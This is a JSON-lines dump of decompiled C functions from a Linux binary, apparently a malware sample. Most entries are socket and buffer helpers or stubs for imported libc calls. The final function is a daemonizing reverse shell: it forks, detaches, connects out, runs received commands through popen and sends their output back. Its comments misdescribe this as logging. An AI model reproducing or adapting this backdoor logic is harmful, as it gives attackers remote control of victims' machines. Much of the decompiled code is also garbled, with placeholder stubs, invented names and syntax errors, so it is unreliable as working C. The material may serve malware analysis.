{"Function Name": "FUN_00434970", "Address": "00434970", "Source Code": "undefined4 FUN_00434970(long param_1, undefined8 param_2, undefined4 param_3)\n{\n    uint currentElementCount; \n    undefined4 returnValue; \n    void *allocatedMemoryPointer; \n    ushort *processedResultPointer; \n    int loopIndex; \n    if (param_1 == 0) { \n        returnValue = 0xffffffff; \n    } else {\n        loopIndex = 0; \n        while (true) { \n            void *functionPointer = (void *)FUN_00426dd0(param_2, param_3, loopIndex, (int[3]){0}); \n            if ((functionPointer == (void *)0x0) || (*(int *)functionPointer == 0)) break; \n            processedResultPointer = (ushort *)FUN_00430d50(0, functionPointer, *(int *)functionPointer, 0); \n            if (processedResultPointer != (ushort *)0x0) { \n                if ((*processedResultPointer & 0xfffd) == 0) { \n                    if (*(void **)(processedResultPointer + 0x18) != (void *)0x0) { \n                        free(*(void **)(processedResultPointer + 0x18)); \n                        *(undefined8 *)(processedResultPointer + 0x18) = 0; \n                        *(undefined4 *)(processedResultPointer + 0x1c) = 0; \n                    }\n                    allocatedMemoryPointer = realloc(*(void **)(param_1 + 0x22400), (ulong)(*(int *)(param_1 + 0x22408) + 1) << 3); \n                    *(void **)(param_1 + 0x22400) = allocatedMemoryPointer; \n                    if (allocatedMemoryPointer == (void *)0x0) { \n                        *(undefined4 *)(param_1 + 0x22408) = 0; \n                        return 0xffffffff; \n                    }\n                    currentElementCount = *(uint *)(param_1 + 0x22408); \n                    *(ushort **)((long)allocatedMemoryPointer + (ulong)currentElementCount * 8) = processedResultPointer; \n                    *(uint *)(param_1 + 0x22408) = currentElementCount + 1; \n                } else {\n                    FUN_00427e80(processedResultPointer); \n                }\n            }\n            free(functionPointer); \n            loopIndex++; \n        }\n        returnValue = *(undefined4 *)(param_1 + 0x22408); \n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_00434ab0", "Address": "00434ab0", "Source Code": "uint check_conditions(long input_param)\n{\n    \n    if ((input_param != 0) && (*(short *)(input_param + 0x22388) == 0xff) &&\n        (*(char *)(input_param + 0x22358) != '\\0') && (*(char *)(input_param + 0x223ad) != '\\0')) {\n        \n        \n        return -(uint)(*(long *)(input_param + 0x223b0) == 0) | 0xffffffef;\n    }\n    \n    \n    return 0xffffffff;\n}"}
{"Function Name": "FUN_00434af0", "Address": "00434af0", "Source Code": "ulong checkInputAndReturn(long input_param)\n{\n    \n    return (input_param != 0) ? \n        \n        (ulong)*(byte *)(input_param + 0x2238a) : \n        \n        0xffffffff;\n}"}
{"Function Name": "thunk_FUN_0042b030", "Address": "00434ca0", "Source Code": "void * thunk_FUN_0042b030(long input_param)\n{\n    void *allocated_memory = (void *)0x0; \n    if ((input_param != 0) && (*(char *)(input_param + 0x66) != '\\0')) { \n        allocated_memory = malloc(0x22430); \n        if (allocated_memory != (void *)0x0) { \n            memset(allocated_memory, 0, 0x22430); \n            *(undefined *)((long)allocated_memory + 0x66) = 1; \n            *(undefined *)((long)allocated_memory + 0x223ac) = 1; \n            *(undefined *)((long)allocated_memory + 0x223c9) = *(undefined *)(input_param + 0x223c9); \n            *(undefined2 *)((long)allocated_memory + 100) = *(undefined2 *)(input_param + 100); \n            *(undefined8 *)((long)allocated_memory + 0x68) = *(undefined8 *)(input_param + 0x68); \n            *(undefined4 *)((long)allocated_memory + 0xb0) = *(undefined4 *)(input_param + 0xb0); \n            *(undefined8 *)((long)allocated_memory + 0x70) = *(undefined8 *)(input_param + 0x70); \n            *(undefined8 *)((long)allocated_memory + 0x78) = *(undefined8 *)(input_param + 0x78); \n            *(undefined *)((long)allocated_memory + 0x223ad) = *(undefined *)(input_param + 0x223ad); \n            *(undefined8 *)((long)allocated_memory + 0x22400) = *(undefined8 *)(input_param + 0x22400); \n            *(undefined4 *)((long)allocated_memory + 0x22408) = *(undefined4 *)(input_param + 0x22408); \n            *(undefined8 *)((long)allocated_memory + 0x90) = *(undefined8 *)(input_param + 0x90); \n            *(undefined8 *)((long)allocated_memory + 0x98) = *(undefined8 *)(input_param + 0x98); \n            *(undefined8 *)((long)allocated_memory + 0xa0) = *(undefined8 *)(input_param + 0xa0); \n            *(undefined8 *)((long)allocated_memory + 0x22410) = *(undefined8 *)(input_param + 0x22410); \n            *(undefined *)((long)allocated_memory + 0x22418) = *(undefined *)(input_param + 0x22418); \n        }\n    }\n    return allocated_memory; \n}"}
{"Function Name": "FUN_00434d50", "Address": "00434d50", "Source Code": "bool FUN_00434d50(long input_param) \n{\n    long intermediate_value; \n    if (input_param != 0) { \n        intermediate_value = *(long *)(input_param + 0x70); \n        if (intermediate_value != 0 && *(long *)(intermediate_value + 0xe0) != 0 && *(int *)(intermediate_value + 0xe8) != 0) { \n            return true; \n        }\n        intermediate_value = *(long *)(input_param + 0x78); \n        if (intermediate_value != 0 && *(long *)(intermediate_value + 0xe0) != 0) { \n            return *(int *)(intermediate_value + 0xe8) != 0; \n        }\n    }\n    return false; \n}"}
{"Function Name": "FUN_00434db0", "Address": "00434db0", "Source Code": "void FUN_00434db0(undefined input_param) \n{\n    FUN_0042afb0(input_param, 0x303); \n}"}
{"Function Name": "FUN_00434dc0", "Address": "00434dc0", "Source Code": "void check_and_free_memory(long input_pointer)\n{\n    \n    if (input_pointer != 0 && *(void **)(input_pointer + 0x223f8) != (void *)0x0) {\n        \n        free(*(void **)(input_pointer + 0x223f8));\n    }\n    \n    call_another_function(input_pointer);\n}"}
{"Function Name": "thunk_FUN_00434dc0", "Address": "00434df0", "Source Code": "void thunk_FUN_00434dc0(long input_param)\n{\n    \n    if (input_param != 0 && *(void **)(input_param + 0x223f8) != (void *)0x0) {\n        \n        memory_free(*(void **)(input_param + 0x223f8));\n    }\n    \n    another_function(input_param);\n}"}
{"Function Name": "FUN_00434e00", "Address": "00434e00", "Source Code": "ulong checkInput(long input_param)\n{\n    \n    return (input_param != 0) ? \n        \n        (unsigned_long)*(byte *)(input_param + 0x22389) : \n        \n        0xffffffff;\n}"}
{"Function Name": "FUN_00434e20", "Address": "00434e20", "Source Code": "undefined8 FUN_00434e20(long input_address, undefined4 input_value)\n{\n    undefined8 *pointer_to_memory; \n    \n    if (input_address == 0) {\n        return 0; \n    }\n    \n    pointer_to_memory = *(undefined8 **)(input_address + 0x223f8);\n    \n    if (pointer_to_memory == (undefined8 *)0x0) {\n        \n        pointer_to_memory = (undefined8 *)malloc(0x28);\n        \n        \n        if (pointer_to_memory == (undefined8 *)0x0) {\n            return 0xfffffff7; \n        }\n        \n        memset(pointer_to_memory, 0, 0x28);\n        \n        \n        *(undefined8 **)(input_address + 0x223f8) = pointer_to_memory;\n    }\n    \n    *(undefined4 *)pointer_to_memory = input_value;\n    return 1; \n}"}
{"Function Name": "FUN_00434eb0", "Address": "00434eb0", "Source Code": "undefined8 FUN_00434eb0(long input_value, undefined8 new_value)\n{\n    undefined8 *pointer_array; \n    undefined8 old_value;   \n    if (input_value == 0) { \n        return 0; \n    }\n    pointer_array = *(undefined8 **)(input_value + 0x223f8); \n    if (pointer_array == (undefined8 *)0x0) { \n        pointer_array = (undefined8 *)malloc(0x28); \n        if (pointer_array == (undefined8 *)0x0) { \n            return 0; \n        }\n        *pointer_array = 0; \n        pointer_array[1] = 0; \n        pointer_array[2] = 0; \n        pointer_array[3] = 0; \n        pointer_array[4] = 0; \n        *(undefined8 **)(input_value + 0x223f8) = pointer_array; \n    }\n    \n    old_value = pointer_array[4]; \n    pointer_array[4] = new_value; \n    return old_value; \n}"}
{"Function Name": "FUN_00434f40", "Address": "00434f40", "Source Code": "undefined8 FUN_00434f40(long input_address)\n{\n    \n    long retrieved_pointer = *(long *)(input_address + 0x223f8);\n    \n    \n    if (input_address != 0 && retrieved_pointer != 0) {\n        \n        return *(undefined8 *)(retrieved_pointer + 0x20);\n    }\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_004350d0", "Address": "004350d0", "Source Code": "void FUN_004350d0(long input_pointer, int condition_flag, undefined8 data_value)\n{\n    undefined8 *allocated_memory; \n    if (input_pointer != 0) { \n        allocated_memory = *(undefined8 **)(input_pointer + 0x223f8); \n        if (allocated_memory == (undefined8 *)0x0) { \n            allocated_memory = (undefined8 *)malloc(0x28); \n            if (allocated_memory == (undefined8 *)0x0) { \n                return; \n            }\n            *allocated_memory = 0; \n            allocated_memory[1] = 0; \n            allocated_memory[2] = 0; \n            allocated_memory[3] = 0; \n            allocated_memory[4] = 0; \n            *(undefined8 **)(input_pointer + 0x223f8) = allocated_memory; \n        }\n        allocated_memory[1] = (condition_flag != 0) ? data_value : 0; \n    }\n}"}
{"Function Name": "FUN_00435160", "Address": "00435160", "Source Code": "ssize_t FUN_00435160(long param_1, void *param_2, int param_3)\n{\n    int file_descriptor; \n    ssize_t return_value; \n    int *int_pointer = *(int **)(param_1 + 0x223f8); \n    \n    if (int_pointer != (int *)0x0) { \n        file_descriptor = *int_pointer; \n        if (file_descriptor >= 0) { \n            if (*(code **)(int_pointer + 4) != (code *)0x0) { \n                return (**(code **)(int_pointer + 4))(file_descriptor, param_2, (long)param_3, 0); \n            }\n            return recv(file_descriptor, param_2, (long)param_3, 0); \n        }\n    }\n    return 0xffffffff; \n}"}
{"Function Name": "FUN_004351b0", "Address": "004351b0", "Source Code": "undefined8 FUN_004351b0(long input_param)\n{\n    int *int_pointer; \n    undefined8 return_value; \n    undefined temp_storage[65544]; \n    \n    if ((input_param == 0) || ((int_pointer = *(int **)(input_param + 0x223f8)) == (int *)0x0) || (*int_pointer < 0))) {\n        return 0xffffffff; \n    }\n    do {\n        \n        if ((*(char *)(input_param + 0x22389) != '\\0') || (*(char *)(input_param + 0x22388) == -1)) {\n            return 1; \n        }\n        \n        \n        int result_value = FUN_00435160(input_param, temp_storage, 0xffff);\n        \n        \n        if (result_value < 1) {\n            return 0xfffffff3; \n        }\n        \n        \n        result_value = FUN_00433830(input_param, temp_storage, result_value, *(undefined8 *)(int_pointer + 2));\n        \n    } while ((result_value < 0) || (return_value = FUN_00434b70(*int_pointer, input_param), -1 < (int)return_value)); \n    return return_value; \n}"}
{"Function Name": "FUN_00435260", "Address": "00435260", "Source Code": "ulong FUN_00435260(long input_param)\n{\n    int *int_pointer; \n    ulong result = 0xffffffff; \n    \n    \n    if ((((input_param != 0) && (int_pointer = *(int **)(input_param + 0x223f8), int_pointer != (int *)0x0)) &&\n        (-1 < *int_pointer)) &&\n        ((*(char *)(input_param + 0x22389) == '\\0' && (result = check_condition(), -1 < (int)result)))) {\n        \n        \n        result = process_data(*int_pointer, input_param);\n        if ((int)result < 0) { \n            return result;\n        }\n        \n        \n        do {\n            result = execute_operation(input_param, NULL, 0xffff); \n            if ((int)result < 1) { \n                return result;\n            }\n            \n            if ((validate_conditions(input_param, NULL, result & 0xffffffff, *(undefined8 *)(int_pointer + 2)) >= 0) &&\n                (result = process_data(*int_pointer, input_param), (int)result < 0)) {\n                return result; \n            }\n        } while ((*(char *)(input_param + 0x22389) == '\\0') && (*(char *)(input_param + 0x22388) != -1));\n        \n        result = 1; \n    }\n    \n    return result; \n}"}
{"Function Name": "FUN_00435320", "Address": "00435320", "Source Code": "undefined8 check_conditions(long input_value) \n{\n    \n    \n    if (input_value != 0 && *(int **)(input_value + 0x223f8) != (int *)0x0 && -1 < **(int **)(input_value + 0x223f8)) {\n        perform_action(); \n        return 0; \n    }\n    return 0xffffffff; \n}"}
{"Function Name": "FUN_00435360", "Address": "00435360", "Source Code": "int FUN_00435360(long input_param)\n{\n    \n    int *int_pointer = *(int **)(input_param + 0x223f8);\n    \n    \n    if (input_param == 0 || int_pointer == (int *)0x0 || *int_pointer < 0) {\n        return -1; \n    }\n    \n    \n    int result_from_fun1 = FUN_00431ac0();\n    \n    \n    if (result_from_fun1 > 0) {\n        \n        int result_from_fun2 = FUN_00434b70(*int_pointer, input_param);\n        \n        \n        if (result_from_fun2 < 1) {\n            return result_from_fun2;\n        }\n    }\n    \n    \n    return result_from_fun1;\n}"}
{"Function Name": "FUN_004354b0", "Address": "004354b0", "Source Code": "undefined4 FUN_004354b0(long input_value)\n{\n    \n    return (input_value != 0) ? \n        \n        *(undefined4 *)(input_value + 0x223a8) : \n        \n        0xffffffff;\n}"}
{"Function Name": "FUN_004354d0", "Address": "004354d0", "Source Code": "undefined8 FUN_004354d0(long input_value, undefined8 data_value_1, undefined8 data_value_2)\n{\n    undefined8 *allocated_memory_pointer; \n    if (input_value == 0) { \n        return 0xffffffff; \n    } else {\n        allocated_memory_pointer = *(undefined8 **)(input_value + 0x223f8); \n        if (allocated_memory_pointer == (undefined8 *)0x0) { \n            allocated_memory_pointer = (undefined8 *)malloc(0x28); \n            if (allocated_memory_pointer == (undefined8 *)0x0) { \n                return 0xfffffff7; \n            }\n            memset(allocated_memory_pointer, 0, 0x28); \n            *(undefined8 **)(input_value + 0x223f8) = allocated_memory_pointer; \n        }\n        \n        allocated_memory_pointer[2] = data_value_1; \n        allocated_memory_pointer[3] = data_value_2; \n        return 0; \n    }\n}"}
{"Function Name": "<EXTERNAL>::__ctype_toupper_loc", "Address": "0066a000", "Source Code": "__int32_t ** get_uppercase_pointer(void)\n{\n    \n    return NULL;\n}"}
{"Function Name": "<EXTERNAL>::raise", "Address": "0066a008", "Source Code": "int raise(int signal_number)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::free", "Address": "0066a010", "Source Code": "void free(void *pointer)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::recv", "Address": "0066a018", "Source Code": "ssize_t recv(int file_descriptor, void *buffer, size_t num_bytes, int flags) \n{\n    halt_baddata(); \n}"}
{"Function Name": "<EXTERNAL>::strcasecmp", "Address": "0066a020", "Source Code": "int strcasecmp(char *string1, char *string2)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::__errno_location", "Address": "0066a028", "Source Code": "int *get_error_location(void) \n{\n    stop_invalid_data(); \n}"}
{"Function Name": "<EXTERNAL>::strcpy", "Address": "0066a030", "Source Code": "char * copy_string(char *destination, char *source)\n{\n    \n    stop_invalid_data();\n}"}
{"Function Name": "<EXTERNAL>::qsort", "Address": "0066a038", "Source Code": "void qsort(void *array, size_t num_elements, size_t element_size, __compar_fn_t compare_function)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::fread", "Address": "0066a040", "Source Code": "size_t fread(void *buffer, size_t element_size, size_t element_count, FILE *file_pointer) \n{\n    halt_baddata(); \n}"}
{"Function Name": "<EXTERNAL>::setsockopt", "Address": "0066a048", "Source Code": "int setsockopt(int socket_fd, int option_level, int option_name, void *option_value, socklen_t option_length)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::fclose", "Address": "0066a050", "Source Code": "int fclose(FILE *file_stream)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::strlen", "Address": "0066a058", "Source Code": "size_t strlen(char *string)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::chdir", "Address": "0066a060", "Source Code": "int chdir(char *path)\n{\n    \n    return halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::send", "Address": "0066a068", "Source Code": "ssize_t send(int file_descriptor, void *buffer, size_t num_bytes, int flags)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::strchr", "Address": "0066a070", "Source Code": "char * strchr(char *string_input, int character_to_find)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::snprintf", "Address": "0066a078", "Source Code": "int snprintf(char *buffer, size_t buffer_size, char *format_string, ...) {\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::nanosleep", "Address": "0066a080", "Source Code": "int nanosleep(timespec *requestedTime, timespec *remainingTime)\n{\n    \n    handleBadData();\n}"}
{"Function Name": "<EXTERNAL>::memset", "Address": "0066a088", "Source Code": "void * memset(void *memory_block, int value, size_t size)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::fgetc", "Address": "0066a090", "Source Code": "int fgetc(FILE *input_stream)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::close", "Address": "0066a098", "Source Code": "int close(int file_descriptor)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::setsid", "Address": "0066a0a0", "Source Code": "__pid_t create_session(void) \n{\n    return terminate_process(); \n}"}
{"Function Name": "<EXTERNAL>::fputc", "Address": "0066a0a8", "Source Code": "int fputc(int character, FILE *output_stream)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::memchr", "Address": "0066a0b0", "Source Code": "void * memchr(void *memory_block, int character_to_find, size_t length)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::read", "Address": "0066a0b8", "Source Code": "ssize_t read(int file_descriptor, void *buffer, size_t num_bytes) \n{\n    halt_baddata(); \n}"}
{"Function Name": "<EXTERNAL>::__libc_start_main", "Address": "0066a0c0", "Source Code": "void main_entry_point(void) \n{\n    handle_bad_data(); \n}"}
{"Function Name": "<EXTERNAL>::memcmp", "Address": "0066a0c8", "Source Code": "int memcmp(void *block1, void *block2, size_t length)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::calloc", "Address": "0066a0d0", "Source Code": "void * calloc(size_t num_elements, size_t element_size)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::strcmp", "Address": "0066a0d8", "Source Code": "int strcmp(char *string1, char *string2)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::signal", "Address": "0066a0e0", "Source Code": "__sighandler_t signal(int signal_number, __sighandler_t signal_handler)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::fprintf", "Address": "0066a0e8", "Source Code": "int fprintf(FILE *file_pointer, char *format_string, ...) {\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::ftell", "Address": "0066a0f0", "Source Code": "long ftell(FILE *file_stream)\n{\n    \n    return handle_bad_data();\n}"}
{"Function Name": "<EXTERNAL>::__gmon_start__", "Address": "0066a0f8", "Source Code": "void initializeProfilingData(void)\n{\n    \n    terminateOnBadData();\n}"}
{"Function Name": "<EXTERNAL>::memcpy", "Address": "0066a100", "Source Code": "void * memcpy(void *destination, void *source, size_t num_bytes)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::time", "Address": "0066a108", "Source Code": "time_t time(time_t *timer)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::fileno", "Address": "0066a110", "Source Code": "int fileno(FILE *file_stream)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::malloc", "Address": "0066a118", "Source Code": "void *allocate_memory(size_t size)\n{\n    \n    handle_bad_data();\n}"}
{"Function Name": "<EXTERNAL>::recvfrom", "Address": "0066a120", "Source Code": "ssize_t recvfrom(int file_descriptor, void *buffer, size_t num_bytes, int flags, sockaddr *address, socklen_t *address_length)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::fseek", "Address": "0066a128", "Source Code": "int fseek(FILE *file_stream, long offset, int whence_option)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::realloc", "Address": "0066a130", "Source Code": "void * realloc(void *pointer, size_t new_size)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::setvbuf", "Address": "0066a138", "Source Code": "int setvbuf(FILE *file_stream, char *buffer, int buffer_mode, size_t buffer_size)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::memmove", "Address": "0066a140", "Source Code": "void * memmove(void *destination, void *source, size_t num_bytes)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::open", "Address": "0066a148", "Source Code": "int open(char *file_path, int open_flags, ...) {\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::popen", "Address": "0066a150", "Source Code": "FILE * popen(char *command, char *mode)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::fopen", "Address": "0066a158", "Source Code": "FILE * fopen(char *filename, char *mode)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::strtok", "Address": "0066a160", "Source Code": "char * strtok(char *input_string, char *delimiters)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::gmtime", "Address": "0066a168", "Source Code": "tm * gmtime(time_t *time_pointer)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::flock", "Address": "0066a170", "Source Code": "void processFlock(void) \n{\n    stopBadData(); \n}"}
{"Function Name": "<EXTERNAL>::exit", "Address": "0066a178", "Source Code": "void exit(int statusCode)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::connect", "Address": "0066a180", "Source Code": "int connect(int file_descriptor, sockaddr *address, socklen_t length)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::strerror", "Address": "0066a188", "Source Code": "char * strerror(int error_number)\n{\n    \n    handle_bad_data();\n}"}
{"Function Name": "<EXTERNAL>::sleep", "Address": "0066a190", "Source Code": "uint sleep(uint duration)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::fork", "Address": "0066a198", "Source Code": "__pid_t create_process(void)  \n{\n    return terminate_process();  \n}"}
{"Function Name": "<EXTERNAL>::strstr", "Address": "0066a1a0", "Source Code": "char *strstr(char *haystack, char *needle)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "<EXTERNAL>::rand", "Address": "0066a1a8", "Source Code": "int generate_random(void) \n{\n    return terminate_invalid_data(); \n}"}
{"Function Name": "<EXTERNAL>::socket", "Address": "0066a1b0", "Source Code": "int socket(int domain, int type, int protocol)\n{\n    \n    halt_baddata();\n}"}
{"Function Name": "entry", "Address": "0040156c", "Source Code": "void processEntry(undefined8 entry_point, undefined8 parameters)\n{\n    \n    __libc_start_main(main_function, parameters, &stack_pointer, init_function, cleanup_function, entry_point, (undefined[8]){0});\n    \n    \n    while (true);\n}"}
{"Function Name": "FUN_00401700", "Address": "00401700", "Source Code": "bool FUN_00401700(int *output_pointer, undefined4 input_value_1, undefined2 input_value_2)\n{\n    int result; \n    undefined4 function_value_1; \n    undefined8 function_value_2; \n    result = FUN_004016a0(input_value_1, input_value_2); \n    *output_pointer = result; \n    if (result >= 0) { \n        FUN_00434b10(); \n        FUN_00434b30(); \n        function_value_1 = FUN_00434cc0(); \n        function_value_2 = FUN_00434db0(function_value_1); \n        *(undefined8 *)(output_pointer + 2) = function_value_2; \n        *(undefined8 *)(output_pointer + 4) = function_value_2; \n        if (FUN_00434e20(function_value_2, *output_pointer) != 0) { \n            return FUN_00435260(*(undefined8 *)(output_pointer + 2)) == 1; \n        }\n    }\n    return false; \n}"}
{"Function Name": "FUN_00401770", "Address": "00401770", "Source Code": "\nvoid FUN_00401770(undefined4 input_param, undefined2 command_param)\n{\n    char last_char; // Variable to hold a character\n    int return_value; // Variable to hold an integer return value\n    uint bit_mask; // Variable for bit manipulation\n    uint bit_check; // Variable for bit manipulation\n    undefined4 *command_ptr; // Pointer for dynamic memory allocation\n    FILE *file_stream; // File pointer for command execution\n    long loop_counter; // Long variable for loop counters\n    ulong bytes_read; // Unsigned long variable for read operation\n    uint *command_part_ptr; // Pointer for processing command\n    uint *next_command_part_ptr; // Pointer for processing command\n    undefined4 *execution_params_ptr; // Pointer for command execution\n    undefined8 *local_input_ptr; // Pointer for local storage\n    bool is_newline; // Boolean variable for condition checks\n    byte is_initialized; // Byte variable for initialization\n    undefined8 local_command_input[128]; // Local storage for command input\n    undefined8 local_command_output[128]; // Local storage for command output\n    char local_command_string[1032]; // Local storage for command string\n\n    is_initialized = 0; // Initialize byte variable\n    command_ptr = (undefined4 *)malloc(0x18); // Allocate memory for command execution\n    *command_ptr = 0; // Initialize first element to 0\n    *(undefined8 *)(command_ptr + 2) = 0; // Initialize third element to 0\n    fork_result = fork(); // Create a new process\n    if ((fork_result != -1) && (fork_result == 0)) { // Check if fork was successful and we are in the child process\n        close(0); // Close standard input\n        close(1); // Close standard output\n        close(2); // Close standard error\n        setsid(); // Create a new session\n        chdir(\"/\"); // Change working directory to root\n        return_value = FUN_00401700(command_ptr, input_param, command_param); // Call function with parameters\n        if (return_value != 0) { // Check if the function succeeded\n            local_input_ptr = local_command_input; // Point to local command input storage\n            for (loop_counter = 0x80; loop_counter != 0; loop_counter--) { // Clear local command input storage\n                *local_input_ptr++ = 0; // Set each element to 0\n            }\n            local_input_ptr = local_command_output; // Point to local command output storage\n            for (loop_counter = 0x80; loop_counter != 0; loop_counter--) { // Clear local command output storage\n                *local_input_ptr++ = 0; // Set each element to 0\n            }\n            FUN_00435360(*(undefined8 *)(command_ptr + 2), &DAT_00435712, 2); // Log some data\n            return_value = FUN_004353b0(*(undefined8 *)(command_ptr + 2), local_command_input, 0x400); // Read command input\n            if (0 < return_value) { // Check if input was read successfully\n                if (*(char *)((long)local_command_input + (long)(return_value - 2)) == '\\r') goto LAB_004019d8; // Check for carriage return\n                loop_counter = (long)(return_value - 1); // Adjust length for processing\n                last_char = *(char *)((long)local_command_input + loop_counter); // Get last character\n                goto joined_r0x004019ef; // Jump to processing\n            }\n            goto LAB_00401a07; // Jump to exit if no input\n        }\n    }\n\n    exit(0); // Exit if not in child process\nLAB_004019d8:\n    *(undefined *)((long)local_command_input + (long)(return_value - 2)) = 0; // Null-terminate the command input\n    if (return_value != 2) { // Check if input length is not equal to 2\n        loop_counter = (long)(return_value - 1); // Adjust length for processing\n        last_char = *(char *)((long)local_command_input + loop_counter); // Get last character\n    joined_r0x004019ef:\n        is_newline = last_char == '\\n'; // Check if last character is newline\n        if (is_newline) { // If it is a newline\n            is_newline = return_value == 1; // Check if input length is 1\n            *(undefined *)((long)local_command_input + loop_counter) = 0; // Null-terminate the command input\n            if (is_newline) goto LAB_00401818; // Jump if input length is 1\n        }\n        loop_counter = 5; // Set loop counter for command comparison\n        local_input_ptr = local_command_input; // Point to local command input storage\n        command_token = \"exit\"; // Command to compare\n        do {\n            if (loop_counter == 0) break; // Break if loop counter reaches 0\n            loop_counter--; // Decrement loop counter\n            is_newline = *(char *)local_input_ptr == *command_token; // Compare characters\n            local_input_ptr++; // Move to next character in command input\n            command_token++; // Move to next character in command\n        } while (is_newline); // Continue while characters match\n        if (is_newline) { // If command matches \"exit\"\n        LAB_00401a07:\n            FUN_00401680(); // Call exit function\n            exit(0); // Exit the process\n        }\n        strcpy(local_command_string, (char *)local_command_input); // Copy command input to local storage\n        command_token = strtok(local_command_string, \" \"); // Tokenize command input\n        if ((*command_token == 'c') && (command_token[1] == 'd') && (command_token[2] == '\\0')) { // Check for \"cd\" command\n            command_token = strtok((char *)0x0, \" \"); // Get the next token (directory)\n            return_value = chdir(command_token); // Change directory\n            if (return_value == -1) { // Check if change directory failed\n                error_message = strerror(*__errno_location()); // Get error message\n                FUN_00435360(*(undefined8 *)(command_ptr + 2), error_message, strlen(error_message)); // Log error message\n                FUN_00435360(*(undefined8 *)(command_ptr + 2), \"\\n\", 2); // Log newline\n            }\n        } else { // If not a \"cd\" command\n            do {\n                command_part_ptr = (uint *)local_input_ptr; // Point to command processing\n                bit_mask = *command_part_ptr + 0xfefefeff & ~*command_part_ptr; // Bit manipulation for command processing\n                bit_check = bit_mask & 0x80808080; // Further bit manipulation\n                local_input_ptr = (undefined8 *)(command_part_ptr + 1); // Move to next command part\n            } while (bit_check == 0); // Continue while no bits are set\n            is_newline = (bit_mask & 0x8080) == 0; // Check if bits are set\n            if (is_newline) { // If bits are not set\n                bit_check = bit_check >> 0x10; // Shift bits for further processing\n            }\n            next_command_part_ptr = command_part_ptr + 1; // Move to next command part\n            if (is_newline) { // If bits were not set\n                next_command_part_ptr = (uint *)((long)command_part_ptr + 6); // Adjust pointer for command processing\n            }\n            execution_params_ptr = (undefined4 *)((long)next_command_part_ptr + (-3 - (ulong)CARRY1((byte)bit_check, (byte)bit_check))); // Prepare for command execution\n            *execution_params_ptr = 0x263e3220; // Set command execution parameters\n            *(undefined2 *)(execution_params_ptr + 1) = 0x31; // Set command execution parameters\n            file_stream = popen((char *)local_command_input, \"r\"); // Execute command and open pipe\n            if (file_stream == (FILE *)0x0) { // Check if command execution failed\n                FUN_00435360(*(undefined8 *)(command_ptr + 2), \"[-] Execute command failed\\n\", 0x1b); // Log failure message\n            } else { // If command executed successfully\n                while (true) { // Loop to read command output\n                    return_value = fileno(file_stream); // Get file descriptor for the stream\n                    bytes_read = read(return_value, local_command_output, 0x3ff); // Read command output\n                    if ((int)bytes_read < 1) break; // Break if no more output\n                    *(undefined *)((long)local_command_output + (long)(int)bytes_read) = 0; // Null-terminate output\n                    FUN_00435360(*(undefined8 *)(command_ptr + 2), local_command_output, bytes_read & 0xffffffff); // Log command output\n                }\n                fclose(file_stream); // Close the stream\n            }\n        }\n    }\n    goto LAB_00401818; // Jump to exit point\n}\n"}
